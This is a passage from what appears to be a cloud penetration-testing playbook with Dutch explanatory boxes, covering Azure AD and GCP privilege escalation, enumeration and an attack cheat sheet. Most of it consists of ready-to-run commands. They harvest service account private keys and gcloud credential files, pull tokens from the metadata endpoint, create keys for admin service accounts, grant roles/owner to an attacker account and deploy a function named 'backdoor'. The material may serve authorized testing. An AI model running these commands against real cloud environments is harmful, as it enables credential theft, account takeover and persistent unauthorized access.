ObjectId
Add-AzureADDirectoryRoleMember -ObjectId $roleId -RefObjectId $userId
```

### Application Consent Abuse
```powershell
# Find apps with dangerous permissions
Get-AzureADServicePrincipal -All $true | ForEach-Object {
    $sp = $_
    Get-AzureADServiceAppRoleAssignment -ObjectId $sp.ObjectId | ForEach-Object {
        [PSCustomObject]@{
            AppName = $sp.DisplayName
            Permission = $_.Id
        }
    }
}

# Dangerous permissions to look for:
# - RoleManagement.ReadWrite.Directory
# - AppRoleAssignment.ReadWrite.All
# - Application.ReadWrite.All
```

> **📘 UITLEG:**
> App consent attacks:
> - Apps met hoge permissions kunnen worden misbruikt
> - Service Principal credentials geven app toegang
> - Consent phishing kan permissions verkrijgen

---

# 3. GCP ATTACK PLAYBOOK

## 3.1 Initial Access

### Service Account Key Discovery
```bash
# Look for service account keys
find / -name "*.json" -exec grep -l "private_key" {} \; 2>/dev/null

# Common locations
cat ~/.config/gcloud/credentials.db
cat ~/.config/gcloud/application_default_credentials.json

# Metadata service (from GCE instance)
curl -H "Metadata-Flavor: Google" http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token
```

### Authenticate
```bash
# With service account key
gcloud auth activate-service-account --key-file=sa-key.json

# Verify identity
gcloud auth list
gcloud config list
```

---

## 3.2 Enumeration

```bash
# List projects
gcloud projects list

# Set project
gcloud config set project [PROJECT_ID]

# List all IAM bindings
gcloud projects get-iam-policy [PROJECT_ID]

# List service accounts
gcloud iam service-accounts list

# List compute instances
gcloud compute instances list

# List storage buckets
gsutil ls

# List bucket contents
gsutil ls gs://[BUCKET_NAME]

# List Cloud Functions
gcloud functions list

# List Cloud Run services
gcloud run services list
```

> **📘 UITLEG:**
> GCP enumeration focust op:
> - IAM bindings (wie heeft welke rechten)
> - Service accounts (vaak overprivileged)
> - Storage buckets (data exposure)
> - Compute resources

---

## 3.3 Privilege Escalation

```bash
# 1. Service Account Key Creation
# If you can create keys for a more privileged SA:
gcloud iam service-accounts keys create key.json --iam-account=admin-sa@project.iam.gserviceaccount.com

# 2. setIamPolicy - Modify IAM bindings
gcloud projects add-iam-policy-binding [PROJECT] \
    --member="serviceAccount:attacker@project.iam.gserviceaccount.com" \
    --role="roles/owner"

# 3. deployFunction - Deploy function with powerful SA
gcloud functions deploy backdoor \
    --runtime python39 \
    --trigger-http \
    --service-account admin-sa@project.iam.gserviceaccount.com

# 4. ActAs - Impersonate service account
gcloud auth print-access-token --impersonate-service-account=admin-sa@project.iam.gserviceaccount.com
```

> **📘 UITLEG:**
> GCP privilege escalation:
> - Service Account impersonation (ActAs)
> - Creating keys for other SAs
> - Deploying resources with powerful SAs
> - Modifying IAM policies

---

# 4. CROSS-CLOUD TECHNIQUES

## 4.1 Common Misconfigurations

```yaml
AWS Common Issues:
  - Public S3 buckets
  - Overly permissive IAM policies
  - Exposed access keys in code
  - IMDS v1 (no token required)
  - Missing CloudTrail logging

Azure Common Issues:
  - Legacy authentication enabled
  - Overpermissioned App Registrations
  - Storage accounts with public access
  - Missing Conditional Access
  - Exposed SAS tokens

GCP Common Issues:
  - Public Cloud Storage buckets
  - Default service account usage
  - Overpermissioned service accounts
  - Missing audit logging
  - Exposed service account keys
```

## 4.2 Cloud Attack Tools Summary

```bash
# AWS
pacu              # AWS exploitation framework
prowler           # AWS security assessment
ScoutSuite        # Multi-cloud security audit
enumerate-iam     # IAM enumeration

# Azure
AzureHound        # Azure AD attack paths
ROADtools         # Azure AD toolkit
MicroBurst        # Azure security toolkit
AADInternals      # Azure AD internals

# GCP
GCPBucketBrute    # Bucket enumeration
gcp-iam-collector # IAM collection

# Multi-Cloud
ScoutSuite        # AWS, Azure, GCP, Alibaba
cloudsploit       # Cloud security scans
```

---

# 5. CLOUD ATTACK CHEAT SHEET

```
╔═══════════════════════════════════════════════════════════════════════════════╗
║                        CLOUD ATTACK QUICK REFERENCE                            ║
╠═══════════════════════════════════════════════════════════════════════════════╣
║                                                                               ║
║  AWS IDENTITY:        aws sts get-caller-identity                             ║
║  AZURE IDENTITY:      az account show                                         ║
║  GCP IDENTITY:        gcloud auth list                                        ║
║                                                                               ║
║  AWS ENUM USERS:      aws iam list-users                                      ║
║  AZURE ENUM USERS:    Get-AzureADUser -All $true                              ║
║  GCP ENUM SAs:        gcloud iam service-accounts list                        ║
║                                                                               ║
║  AWS LIST BUCKETS:    aws s3 ls                                               ║
║  AZURE LIST STORAGE:  az storage account list                                 ║
║  GCP LIST BUCKETS:    gsutil ls                                               ║
║                                                                               ║
║  METADATA SERVICE:                                                            ║
║  AWS:   http://169.254.169.254/latest/meta-data/                              ║
║  AZURE: http://169.254.169.254/metadata/instance?api-version=2021-02-01       ║
║  GCP:   http://169.254.169.254/computeMetadata/v1/                            ║
║                                                                               ║
╚═══════════════════════════════════════════════════════════════════════════════╝
```

---

**EINDE CLOUD ATTACK PLAYBOOK**

